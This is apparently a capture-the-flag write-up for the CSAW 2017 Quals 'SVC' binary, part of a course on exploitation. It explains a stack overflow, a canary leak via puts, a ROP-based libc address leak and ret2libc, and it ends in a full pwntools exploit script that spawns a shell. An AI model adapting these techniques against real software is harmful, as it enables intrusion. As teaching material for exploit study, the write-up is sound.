# Csaw 2017 Quasl SVC

This was solved on Ubuntu 16.04 with libc version `libc-2.23.so`.

Let's take a look at the binary:
```
$ file svc 
svc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=8585d22b995d2e1ab76bd520f7826370df71e0b6, stripped
$ pwn checksec svc 
[*] '/Hackery/course/content/ctf_course/modules/bof_dynamic/csawquals17_svc/svc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ ./svc 
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>1
-------------------------
[*]SCV IS ALWAYS HUNGRY.....
-------------------------
[*]GIVE HIM SOME FOOD.......
-------------------------
>>15935728
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>2
-------------------------
[*]REVIEW THE FOOD...........
-------------------------
[*]PLEASE TREAT HIM WELL.....
-------------------------
15935728
�k8
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>3
[*]BYE ~ TIME TO MINE MIENRALS...
```

So we can see that it is a `64` bit dynamically linked binary, with a stack canary and a non-executable stack. When we run it it gives us three options. We can input data, print the data, and exit. Looking through the various functions in Ghidra, we can see that the `FUN_00400a9` function holds the menu we are prompted with (also we can see that the code was written in C++):

```

undefined8 menu(void)

{
  long lVar1;
  bool bVar2;
  basic_ostream *this;
  long in_FS_OFFSET;
  int menuChoice;
  char input [168];
  long stackCanary;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  menuChoice = 0;
  bVar2 = true;
  while (bVar2) {
    this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"-------------------------");
    operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>)
    ;
    this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"[*]SCV GOOD TO GO,SIR....");
    operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>)
    ;
    this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"-------------------------");
    operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>)
    ;
    this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"1.FEED SCV....");
    operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>)
    ;
    this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"2.REVIEW THE FOOD....");
    operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>)
    ;
    this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"3.MINE MINERALS....");
    operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>)
    ;
    this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"-------------------------");
    operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>)
    ;
    operator<<<std--char_traits<char>>((basic_ostream *)cout,">>");
    operator>>((basic_istream<char,std--char_traits<char>> *)cin,&menuChoice);
    if (menuChoice == 2) {
      this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"-------------------------");
      operator<<((basic_ostream<char,std--char_traits<char>> *)this,
                 endl<char,std--char_traits<char>>);
      this = operator<<<std--char_traits<char>>
                       ((basic_ostream *)cout,"[*]REVIEW THE FOOD...........");
      operator<<((basic_ostream<char,std--char_traits<char>> *)this,
                 endl<char,std--char_traits<char>>);
      this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"-------------------------");
      operator<<((basic_ostream<char,std--char_traits<char>> *)this,
                 endl<char,std--char_traits<char>>);
      this = operator<<<std--char_traits<char>>
                       ((basic_ostream *)cout,"[*]PLEASE TREAT HIM WELL.....");
      operator<<((basic_ostream<char,std--char_traits<char>> *)this,
                 endl<char,std--char_traits<char>>);
      this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"-------------------------");
      operator<<((basic_ostream<char,std--char_traits<char>> *)this,
                 endl<char,std--char_traits<char>>);
      puts(input);
    }
    else {
      if (menuChoice == 3) {
        bVar2 = false;
        this = operator<<<std--char_traits<char>>
                         ((basic_ostream *)cout,"[*]BYE ~ TIME TO MINE MIENRALS...");
        operator<<((basic_ostream<char,std--char_traits<char>> *)this,
                   endl<char,std--char_traits<char>>);
      }
      else {
        if (menuChoice == 1) {
          this = operator<<<std--char_traits<char>>
                           ((basic_ostream *)cout,"-------------------------");
          operator<<((basic_ostream<char,std--char_traits<char>> *)this,
                     endl<char,std--char_traits<char>>);
          this = operator<<<std--char_traits<char>>
                           ((basic_ostream *)cout,"[*]SCV IS ALWAYS HUNGRY.....");
          operator<<((basic_ostream<char,std--char_traits<char>> *)this,
                     endl<char,std--char_traits<char>>);
          this = operator<<<std--char_traits<char>>
                           ((basic_ostream *)cout,"-------------------------");
          operator<<((basic_ostream<char,std--char_traits<char>> *)this,
                     endl<char,std--char_traits<char>>);
          this = operator<<<std--char_traits<char>>
                           ((basic_ostream *)cout,"[*]GIVE HIM SOME FOOD.......");
          operator<<((basic_ostream<char,std--char_traits<char>> *)this,
                     endl<char,std--char_traits<char>>);
          this = operator<<<std--char_traits<char>>
                           ((basic_ostream *)cout,"-------------------------");
          operator<<((basic_ostream<char,std--char_traits<char>> *)this,
                     endl<char,std--char_traits<char>>);
          operator<<<std--char_traits<char>>((basic_ostream *)cout,">>");
          read(0,input,0xf8);
        }
        else {
          this = operator<<<std--char_traits<char>>
                           ((basic_ostream *)cout,"[*]DO NOT HURT MY SCV....");
          operator<<((basic_ostream<char,std--char_traits<char>> *)this,
                     endl<char,std--char_traits<char>>);
        }
      }
    }
  }
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Looking through it, we see that this menu runs in a while true loop:

```
  while (bVar2) {
    this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"-------------------------");
```

For each iteration of the loop, we see that it prompts us for a menu option:
```
    operator<<<std--char_traits<char>>((basic_ostream *)cout,">>");
    operator>>((basic_istream<char,std--char_traits<char>> *)cin,&menuChoice);
    if (menuChoice == 2) {
```

For the option to scan in data (option `1`) we see that it uses `read` to scan in `0xf8` bytes of data into `input`. Since `input` is a `168` (`0xa8`) byte char array, this option gives us a buffer overflow. The extra space is more than enough to overwrite the return address:

```
          operator<<<std--char_traits<char>>((basic_ostream *)cout,">>");
          read(0,input,0xf8);
```

Looking at the contents of the memory after we feed it the string `15935728`, we can see there are `0xb8` bytes between the start of our input and the return address (this breakpoint is for right after the read call):

```
Breakpoint 1, 0x0000000000400cd3 in ?? ()
gef➤  i f
Stack level 0, frame at 0x7fffffffded0:
 rip = 0x400cd3; saved rip = 0x7ffff767cb97
 called by frame at 0x7fffffffdf90
 Arglist at 0x7fffffffddf8, args: 
 Locals at 0x7fffffffddf8, Previous frame's sp is 0x7fffffffded0
 Saved registers:
  rbp at 0x7fffffffdec0, rip at 0x7fffffffdec8
gef➤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffde10 - 0x7fffffffde18  →   "15935728[...]" 
```

A bit of python math:

```
>>> hex(0x7fffffffdec8 - 0x7fffffffde10)
'0xb8'
```

For the option `2` to show the input, we see that it just prints `input` with the `puts` function:

```
      puts(input);
```

Finally with option `3`, we see it essentially just exits the loop and returns by setting `bVar2` to false. We will need to send this option to get the code to return, so we can get code execution with the buffer overflow:

```
    else {
      if (menuChoice == 3) {
        bVar2 = false;
        this = operator<<<std--char_traits<char>>
                         ((basic_ostream *)cout,"[*]BYE ~ TIME TO MINE MIENRALS...");
        operator<<((basic_ostream<char,std--char_traits<char>> *)this,
                   endl<char,std--char_traits<char>>);
      }
```

So we have a buffer overflow bug that we can use to get the return address. However the first mitigation we will need to overcome is the stack canary. The stack canary is an eight byte random integer (four bytes for `x86` systems) that is placed between the variables and the return address. In order to overwrite the return address, we have to overwrite the stack canary. However before the return address is executed, it checks to see if the stack canary has the same value. If it doesn't the program immediately ends.

In order to bypass this, we will need to leak the stack canary. That way we can just overwrite the stack canary with itself, so it will pass the stack canary check and execute the return address (which we will overwrite). We will leak it with the `puts` call, which will print data that it is given a pointer to until it reaches a null byte. With stack canaries the least significant byte is a null byte. So we will just send enough data just to overflow the least significant byte of the stack canary, then print our input. This will print all of our data and the highest seven eight bytes of the stack canary, and since we the lowest byte will always be a null byte, we know the full stack canary. Then we can just execute the buffer overflow again and write over the stack canary with itself in order to defeat this mitigation.

In order to leak the canary we will need to send `0xa9` bytes worth of data. The first `0xa8` will be to fill up the `input` char array, and the last byte will be to overwrite the least signifcant byte of the stack canary. Let's take a look at the memory for a bit more detail:

```
gef➤  x/24g 0x7ffe80d6b4e0
0x7ffe80d6b4e0: 0x3832373533393531  0x00007fa279a33628
0x7ffe80d6b4f0: 0x0000000000400930  0x00007fa279686489
0x7ffe80d6b500: 0x00007ffe80d6b540  0x0000000000000001
0x7ffe80d6b510: 0x00007ffe80d6b540  0x0000000000601df8
0x7ffe80d6b520: 0x00007ffe80d6b688  0x0000000000400e1b
0x7ffe80d6b530: 0x0000000000000000  0x000000010000ffff
0x7ffe80d6b540: 0x00007ffe80d6b550  0x0000000000400e31
0x7ffe80d6b550: 0x0000000000000002  0x0000000000400e8d
0x7ffe80d6b560: 0x00007fa279dcd9a0  0x0000000000000000
0x7ffe80d6b570: 0x0000000000400e40  0x00000000004009a0
0x7ffe80d6b580: 0x00007ffe80d6b670  0x05345bfe35ee0700
0x7ffe80d6b590: 0x0000000000400e40  0x00007fa279664b97
```

here we can see our input `15935728` starts at `0x7ffe80d6b4e0`. `0xa8` bytes down the stack we can see the stack canary `0x05345bfe35ee0700` at `0x7ffe80d6b588` followed by the saved base pointer and return addess. After the overflow this is what the memory looks like:

```
gef➤  x/24g 0x7ffe80d6b4e0
0x7ffe80d6b4e0: 0x3030303030303030  0x3030303030303030
0x7ffe80d6b4f0: 0x3030303030303030  0x3030303030303030
0x7ffe80d6b500: 0x3030303030303030  0x3030303030303030
0x7ffe80d6b510: 0x3030303030303030  0x3030303030303030
0x7ffe80d6b520: 0x3030303030303030  0x3030303030303030
0x7ffe80d6b530: 0x3030303030303030  0x3030303030303030
0x7ffe80d6b540: 0x3030303030303030  0x3030303030303030
0x7ffe80d6b550: 0x3030303030303030  0x3030303030303030
0x7ffe80d6b560: 0x3030303030303030  0x3030303030303030
0x7ffe80d6b570: 0x3030303030303030  0x3030303030303030
0x7ffe80d6b580: 0x3030303030303030  0x05345bfe35ee0730
0x7ffe80d6b590: 0x0000000000400e40  0x00007fa279664b97
```

With that, we can leak the stack canary by printing our input.

The next step will be to defeat ASLR. ASLR is a mitigation that will essential randomize the addresses sections of memory are in. This way when we run the program, we don't actually know where various things in memory are. While the addresses are randomized, the spacing between things are not. For instance in the libc (libc is where all of the standard functions like `puts`, `printf`, and `fgets` are stored most of the time) the address of `puts` and `system` will be different every time we run the program. However the offset between them will not be. So if we leak the address of `puts`, we can just add / subtract the offset to `system` and we will have the address of `system`. So we just need to leak a single address from a memory space (that we know what that memory address points to) in order to break ASLR in that region.


Let's take a look at all of the different memory regions in gdb with the `vmmap` command while the program is running:
```
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000402000 0x0000000000000000 r-x /Hackery/csaw/svc
0x0000000000601000 0x0000000000602000 0x0000000000001000 r-- /Hackery/csaw/svc
0x0000000000602000 0x0000000000603000 0x0000000000002000 rw- /Hackery/csaw/svc
0x0000000000603000 0x0000000000635000 0x0000000000000000 rw- [heap]
0x00007ffff716c000 0x00007ffff7182000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7182000 0x00007ffff7381000 0x0000000000016000 --- /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7381000 0x00007ffff7382000 0x0000000000015000 rw- /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7382000 0x00007ffff748a000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libm-2.23.so
0x00007ffff748a000 0x00007ffff7689000 0x0000000000108000 --- /lib/x86_64-linux-gnu/libm-2.23.so
0x00007ffff7689000 0x00007ffff768a000 0x0000000000107000 r-- /lib/x86_64-linux-gnu/libm-2.23.so
0x00007ffff768a000 0x00007ffff768b000 0x0000000000108000 rw- /lib/x86_64-linux-gnu/libm-2.23.so
0x00007ffff768b000 0x00007ffff784b000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff784b000 0x00007ffff7a4b000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7a4b000 0x00007ffff7a4f000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7a4f000 0x00007ffff7a51000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7a51000 0x00007ffff7a55000 0x0000000000000000 rw- 
0x00007ffff7a55000 0x00007ffff7bc7000 0x0000000000000000 r-x /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007ffff7bc7000 0x00007ffff7dc7000 0x0000000000172000 --- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007ffff7dc7000 0x00007ffff7dd1000 0x0000000000172000 r-- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007ffff7dd1000 0x00007ffff7dd3000 0x000000000017c000 rw- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fd8000 0x00007ffff7fde000 0x0000000000000000 rw- 
0x00007ffff7ff7000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
```

So we can see all of the memory regions here. The memory region I am going to break ASLR in is the `libc-2.23.so` region starting at `0x00007ffff768b000` and ending at `0x00007ffff784b000`. There are two resons for this. The first is that if we leak an address in this region, it will give us access to a lot of gadgets so we can do a lot of things with our code. The second is that we can get an infoleak in this region. Looking at the imported functions in Ghidra, we can see that `puts` is an imported function. Puts will print the data pointed to by a pointer it is handed, until it reaches a null byte. The GOT table is a section of memory in the elf that holds various libc addresses. It does this so the binary knows where it can find those addresses, since it doesn't know what they will be when it compiles. Since PIE is disabled, the GOT entry addresses aren't randomized and we know what they are. So if we were to pass the GOT entry address for `puts` to `puts` (which we can call since it is an imported function, meaning it is compiled into the binary, and we know it's address because there is no pie) we will get the libc address of `puts`. 

Also a quick tangent, pie (position independent executable) essentially means there is ASLR for addresses in the elf. For this binary that would include these regions. If this was enabled and we wanted to do what we are doing with the `puts` infoleak, we would need another infoleak in this region:

```
0x0000000000400000 0x0000000000402000 0x0000000000000000 r-x /Hackery/course/content/ctf_course/modules/bof_dynamic/csawquals17_svc/svc
0x0000000000601000 0x0000000000602000 0x0000000000001000 r-- /Hackery/course/content/ctf_course/modules/bof_dynamic/csawquals17_svc/svc
0x0000000000602000 0x0000000000603000 0x0000000000002000 rw- /Hackery/course/content/ctf_course/modules/bof_dynamic/csawquals17_svc/svc
```

To do this infoleak, we will need three things. The plt address of `puts` (address of the imported function which we will use to call it), the address of the got entry of `puts` (holds the libc address), and a rop gadget to pop the got entry into the `rdi` register, and then return. Since `puts` expects it's input (a single char pointer) in the `rdi` register, that is where we need to place it. To find the `plt` and `got` addresses, we can just use pwntools:

```
$ python
Python 2.7.15rc1 (default, Nov 12 2018, 14:31:15) 
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> elf = ELF('svc')
[*] '/Hackery/course/content/ctf_course/modules/bof_dynamic/csawquals17_svc/svc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
>>> print "plt address: " + hex(elf.symbols['puts'])
plt address: 0x4008cc
>>> print "got address: " + hex(elf.got['puts'])
got address: 0x602018
```

To find the rop gadget we need, we can use a ROP gadget finding utillity called ROPGadget (https://github.com/JonathanSalwan/ROPgadget):

```
$ python ROPgadget.py --binary svc | grep "pop rdi"
0x0000000000400ea3 : pop rdi ; ret
```

The last mitigation we will overcome is the Non-Executable Stack. This essentially means that the stack does not have the execute permission. So we cannot execute code on the stack. Our method to bypass this will be using a mix of a simple ROP chain, and a ret2libc (return to libc) attack. ROP (return oriented programming) is when we essentially take bits of code that is already in the binary, and stich them together to make code that does what we want. It will be comprised of ROP gadgets, which are essentially pointers to bits of code that end in a `ret` instruction, which will make it move to the next gadget. Since these are all valid instruction pointers to code that should run, it will be marked as executable and we won't have any issues. Also a fun side not, if we were to make a ROP gadget that jumps in the middle of an instruction, it would completely change what the instruction does.

One more thing, since our exploit relies off of the libc memory region, the version of libc running will make a bit of a difference with the exploit's offsets. It isn't anything too big, but you will need to make a few changes. If you are running a different libc version than what I am, your offsets here should be different. To see what libc version you are running, you can use the `vmmap` command:

```
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000402000 0x0000000000000000 r-x /Hackery/csaw/svc
0x0000000000601000 0x0000000000602000 0x0000000000001000 r-- /Hackery/csaw/svc
0x0000000000602000 0x0000000000603000 0x0000000000002000 rw- /Hackery/csaw/svc
0x0000000000603000 0x0000000000635000 0x0000000000000000 rw- [heap]
0x00007ffff716c000 0x00007ffff7182000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7182000 0x00007ffff7381000 0x0000000000016000 --- /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7381000 0x00007ffff7382000 0x0000000000015000 rw- /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7382000 0x00007ffff748a000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libm-2.23.so
0x00007ffff748a000 0x00007ffff7689000 0x0000000000108000 --- /lib/x86_64-linux-gnu/libm-2.23.so
0x00007ffff7689000 0x00007ffff768a000 0x0000000000107000 r-- /lib/x86_64-linux-gnu/libm-2.23.so
0x00007ffff768a000 0x00007ffff768b000 0x0000000000108000 rw- /lib/x86_64-linux-gnu/libm-2.23.so
0x00007ffff768b000 0x00007ffff784b000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff784b000 0x00007ffff7a4b000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7a4b000 0x00007ffff7a4f000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7a4f000 0x00007ffff7a51000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7a51000 0x00007ffff7a55000 0x0000000000000000 rw- 
0x00007ffff7a55000 0x00007ffff7bc7000 0x0000000000000000 r-x /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007ffff7bc7000 0x00007ffff7dc7000 0x0000000000172000 --- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007ffff7dc7000 0x00007ffff7dd1000 0x0000000000172000 r-- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007ffff7dd1000 0x00007ffff7dd3000 0x000000000017c000 rw- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fd8000 0x00007ffff7fde000 0x0000000000000000 rw- 
0x00007ffff7ff7000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
``` 

Here we can see that the libc file is `/lib/x86_64-linux-gnu/libc-2.23.so`. Now there are three offsets we need to find from the base of libc. Those are for `system`, `puts` (we will subtract this offset from the libc puts address to get it's base), and the string `/bin/sh`. We can do that by hand with a bit. First grab the addresses of the things we need in memory:

```
gef➤  p puts
$1 = {<text variable, no debug info>} 0x7ffff76fa690 <_IO_puts>
gef➤  p system
$2 = {<text variable, no debug info>} 0x7ffff76d0390 <__libc_system>
gef➤  search-pattern /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/lib/x86_64-linux-gnu/libc-2.23.so'(0x7ffff768b000-0x7ffff784b000), permission=r-x
  0x7ffff7817d57 - 0x7ffff7817d5e  →   "/bin/sh" 
```

Then subtract the base address of the memory region from the addresses to get the offset:
```
>>> hex(0x7ffff76fa690 - 0x00007ffff768b000)
'0x6f690'
>>> hex(0x7ffff76d0390 - 0x00007ffff768b000)
'0x45390'
>>> hex(0x7ffff7817d57 - 0x00007ffff768b000)
'0x18cd57'
```

One last thing I need to say about this exploit. I mentioned earlier that our strategy is to first leak the stack canary, then overflow the return address with a simple ROP chain that will give us a libc infoleak, then loop back around to the start of menu so we can re-exploit the bug with a libc infoleak. When we re-exploit it a second time, we will use the libc infoleak to just call `system` with the argument `/bin/sh` (both in the libc) to give us a shell. The particular address we will loop back to will be `0x400a96` (the start of `menu`), sometimes it's a bit more tricky than that but not now.

Putting it all together, we get the following exploit:
```
# Import pwntools
from pwn import *

target = process("./svc")
gdb.attach(target)

elf = ELF('svc')


# 0x0000000000400ea3 : pop rdi ; ret
popRdi = p64(0x400ea3)

gotPuts = p64(0x602018)
pltPuts = p64(0x4008cc)

offsetPuts = 0x6f690
offsetSystem = 0x45390
offsetBinsh = 0x18cd57
#offsetPuts = 0x83cc0
#offsetSystem = 0x52fd0
#offsetBinsh = 0x1afb84

startMain = p64(0x400a96)

# Establish fucntions to handle I/O with the target
def feed(data):
  print target.recvuntil(">>")
  target.sendline('1')
  print target.recvuntil(">>")
  target.send(data)

def review():
  print target.recvuntil(">>")
  target.sendline('2')
  #print target.recvuntil("[*]PLEASE TREAT HIM WELL.....\n-------------------------\n")
  #leak = target.recvuntil("-------------------------").replace("-------------------------", "")
  print target.recvuntil("0"*0xa9)
  canaryLeak = target.recv(7)
  canary = u64("\x00" + canaryLeak)
  print "canary is: " + hex(canary)
  return canary

def leave():
  print target.recvuntil(">>")
  target.sendline("3")

# Start of with the canary leak. We will overflow the buffer write up to the stack canary, and overwrite the least signifcant byte of the canary
leakCanary = ""
leakCanary += "0"*0xa8 # Fill up space up to the canary
leakCanary += "0" # Overwrite least significant byte of the canary



feed(leakCanary) # Execute the overwrite

canary = review() # Leak the canary, and parse it out

# Start the rop chain to give us a libc infoleak
leakLibc = ""
leakLibc += "0"*0xa8 # Fill up space up to the canary
leakLibc += p64(canary) # Overwrite the stack canary with itself
leakLibc += "1"*0x8 # 8 more bytes until the return address
leakLibc += popRdi # Pop got entry for puts in rdi register
leakLibc += gotPuts # GOT address of puts
leakLibc += pltPuts # PLT address of puts
leakLibc += startMain # Loop back around to the start of main

# Send the payload to leak libc
feed(leakLibc)

# Return to execute our code
leave()

# Scan in and parse out the infoleak

print target.recvuntil("[*]BYE ~ TIME TO MINE MIENRALS...\x0a")

putsLeak = target.recvline().replace("\x0a", "")

putsLibc = u64(putsLeak + "\x00"*(8-len(putsLeak)))

# Calculate the needed addresses

libcBase = putsLibc - offsetPuts
systemLibc = libcBase + offsetSystem
binshLibc = libcBase + offsetBinsh

print "libc base: " + hex(libcBase)

# Form the payload to return to system

payload = ""
payload += "0"*0xa8
payload += p64(canary)
payload += "1"*0x8
payload += popRdi # Pop "/bin/sh" into the rdi register, where it expects it's argument (single char pointer)
payload += p64(binshLibc) # Address to '/bin/sh'
payload += p64(systemLibc) # Libc address of system

# Send the final payload
feed(payload)

target.sendline("3")

#feed(payload)

# Return to execute our code, return to system and get a shell
#leave()

target.interactive()
```